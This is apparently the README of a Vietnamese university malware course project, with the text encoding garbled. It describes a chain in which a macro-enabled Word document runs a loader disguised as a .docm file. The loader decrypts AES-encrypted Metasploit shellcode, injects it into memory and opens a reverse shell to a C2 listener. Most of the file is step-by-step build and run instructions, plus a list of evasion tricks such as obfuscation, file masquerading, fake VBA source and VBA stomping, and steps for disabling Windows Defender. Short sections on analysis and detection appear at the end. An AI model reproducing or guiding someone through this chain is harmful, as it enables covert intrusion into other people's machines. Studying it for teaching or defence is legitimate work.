# Malware Reverse Shell - Memory Injection vá»›i AES-256-GCM
**NT230 - CÆ¡ Cháº¿ Hoáº¡t Äá»™ng Cá»§a MÃ£ Äá»™c - Äá»“ Ãn**

## ğŸ¯ Workflow

```
Word Document (BT6.docm) 
    â†“
VBA Macro cháº¡y khi má»Ÿ file
    â†“
Äá»•i tÃªn BT6.docm â†’ ~temp.exe vÃ  thá»±c thi
    â†“
Loader (~temp.exe) Ä‘á»c file BT7.docm
    â†“
Giáº£i mÃ£ AES-256-GCM â†’ Shellcode
    â†“
Memory Injection:
  - VirtualAlloc (RW)
  - memcpy shellcode
  - VirtualProtect (RX)
  - CreateThread
    â†“
Shellcode thá»±c thi â†’ Reverse Shell káº¿t ná»‘i C2
```

## ğŸ“ Cáº¥u trÃºc Project

```
Malware_Revershell/
â”œâ”€â”€ generate_shellcode.py    # Táº¡o shellcode (msfvenom/test)
â”œâ”€â”€ listener.py               # C2 listener
â”œâ”€â”€ loader/
â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â””â”€â”€ loader.c         # C loader: decrypt + inject
â”‚   â”œâ”€â”€ encryptor.py         # Encrypt shellcode AES-256-GCM
â”‚   â””â”€â”€ build.bat            # Build loader â†’ BT6.docm
â”‚
VBA_Code/
â”œâ”€â”€ malicious_code.vba       # Macro: Ä‘á»•i tÃªn + cháº¡y loader
â””â”€â”€ fake_source.vba          # Fake code Ä‘á»ƒ bypass analysis
```

## ğŸš€ HÆ°á»›ng dáº«n sá»­ dá»¥ng

### BÆ°á»›c 1: Táº¡o Shellcode

```bash
# Cáº§n cÃ i Metasploit Framework
python generate_shellcode.py 192.168.1.100 4444
```
Output: `shellcode.bin`

### BÆ°á»›c 2: MÃ£ hÃ³a Shellcode

```bash
# Install dependencies
pip install cryptography

# Encrypt shellcode thÃ nh BT7.docm
python loader\encryptor.py shellcode.bin BT7.docm
```

**LÆ°u Ã½:** Password máº·c Ä‘á»‹nh = `NT230_Group5_Key`
- Thay Ä‘á»•i trong [loader/encryptor.py](loader/encryptor.py) line 108
- Cáº­p nháº­t trong [loader/src/loader.c](loader/src/loader.c) line 23

### BÆ°á»›c 3: Build Loader

```bash
cd loader
build.bat
```

**Requirements:**
- MinGW-w64, hoáº·c
- Visual Studio vá»›i C++ tools

Output: `BT6.docm` (thá»±c cháº¥t lÃ  .exe)

### BÆ°á»›c 4: Táº¡o Word Document vá»›i Macro

1. Táº¡o Word document má»›i
2. Enable macros (Developer tab)
3. Copy code tá»« [VBA_Code/malicious_code.vba](../VBA_Code/malicious_code.vba)
4. LÆ°u document cÃ¹ng thÆ° má»¥c vá»›i:
   - `BT6.docm` (loader exe)
   - `BT7.docm` (encrypted shellcode)

### BÆ°á»›c 5: Cháº¡y C2 Listener

```bash
python listener.py 4444
```

### BÆ°á»›c 6: Thá»±c thi

1. Má»Ÿ Word document
2. Enable macros khi Ä‘Æ°á»£c há»i
3. Macro tá»± Ä‘á»™ng:
   - Äá»•i BT6.docm â†’ ~temp.exe
   - Cháº¡y ~temp.exe
4. Loader giáº£i mÃ£ BT7.docm vÃ  inject shellcode
5. Reverse shell káº¿t ná»‘i vá» C2

## ğŸ” Ká»¹ thuáº­t Bypass sá»­ dá»¥ng

### 1. VBA Obfuscation
- String encoding (DecodeString function)
- Hidden execution (`shell.Run ... 0`)
- Delay execution (Timer loop)

### 2. File Masquerading
- `.docm` extension cho executable files
- TÃªn file giá»‘ng document

### 3. Encryption
- **AES-256-GCM** cho shellcode
- PBKDF2 key derivation
- Authentication tag Ä‘á»ƒ chá»‘ng tampering

### 4. Memory-only Execution
- KhÃ´ng write shellcode ra disk
- VirtualAlloc â†’ Memory injection
- Cháº¡y trong process space

### 5. Anti-Analysis
- KhÃ´ng hardcode string
- Fake VBA source ([fake_source.vba](../VBA_Code/fake_source.vba))
- VBA stomping compatible

### Bypass Windows Defender


1. **Táº¯t Real-time Protection:**
   ```
   Settings â†’ Windows Security â†’ Virus & threat protection
   â†’ Real-time protection: Off
   ```

2. **Hoáº·c add exclusion:**
   ```
   â†’ Exclusions â†’ Add folder
   â†’ Chá»n folder chá»©a project
   ```

## ğŸ“Š PhÃ¢n tÃ­ch Malware

### Static Analysis

```bash
# Check PE headers
dumpbin /headers loader\BT6.docm

# Strings analysis
strings BT6.docm

# Import table
dumpbin /imports BT6.docm
```

Sáº½ tháº¥y:
- `VirtualAlloc`, `VirtualProtect` â†’ Memory manipulation
- `BCrypt*` â†’ Encryption functions
- `CreateThread` â†’ Code injection

### Dynamic Analysis

```bash
# Process Monitor (Sysinternals)
procmon.exe

# API Monitor
apimonitor.exe

# Debugger
x64dbg BT6.docm
```

## ğŸ“ Educational Notes

### Ká»¹ thuáº­t há»c Ä‘Æ°á»£c:

1. **VBA Macro Malware**
   - Auto-execution (AutoOpen)
   - File manipulation
   - Process execution

2. **Cryptography**
   - AES-256-GCM symmetric encryption
   - PBKDF2 key derivation
   - Nonce vÃ  authentication tags

3. **Memory Injection**
   - VirtualAlloc/VirtualProtect
   - DEP bypass (RW â†’ RX)
   - Thread injection

4. **Evasion Techniques**
   - String obfuscation
   - File masquerading
   - Encrypted payload
   - Memory-only execution

### Detection Methods:

1. **Behavior-based:**
   - VBA executing external process
   - Memory allocation patterns
   - Network connections

2. **Signature-based:**
   - Known shellcode patterns
   - API call sequences
   - Encryption artifacts

## âš ï¸ Legal Disclaimer

**CHá»ˆ Sá»¬ Dá»¤NG CHO Má»¤C ÄÃCH Há»ŒC Táº¬P VÃ€ NGHIÃŠN Cá»¨U**

- ÄÃ¢y lÃ  Ä‘á»“ Ã¡n mÃ´n há»c NT230 - UIT
- KhÃ´ng sá»­ dá»¥ng cho má»¥c Ä‘Ã­ch báº¥t há»£p phÃ¡p
- Test trong mÃ´i trÆ°á»ng cÃ´ láº­p/mÃ¡y áº£o
- TuÃ¢n thá»§ luáº­t phÃ¡p vá» an ninh máº¡ng

## ğŸ“š References

- [AES-GCM Encryption](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- [Windows API Memory Injection](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/)
- [VBA Macro Security](https://docs.microsoft.com/en-us/deployoffice/security/internet-macros-blocked)
- [Metasploit Framework](https://www.metasploit.com/)

## ğŸ› ï¸ Troubleshooting

**Loader khÃ´ng cháº¡y:**
- Kiá»ƒm tra BT7.docm cÃ³ tá»“n táº¡i
- Verify password trong loader.c vÃ  encryptor.py khá»›p nhau
- Check Windows Defender/antivirus

**Shellcode khÃ´ng káº¿t ná»‘i:**
- Verify LHOST/LPORT Ä‘Ãºng
- Check firewall
- Äáº£m báº£o listener Ä‘ang cháº¡y

**Build lá»—i:**
- Install MinGW hoáº·c Visual Studio
- Check bcrypt.lib cÃ³ trong system

---

**Created for NT230 - UIT - Academic Purpose Only**
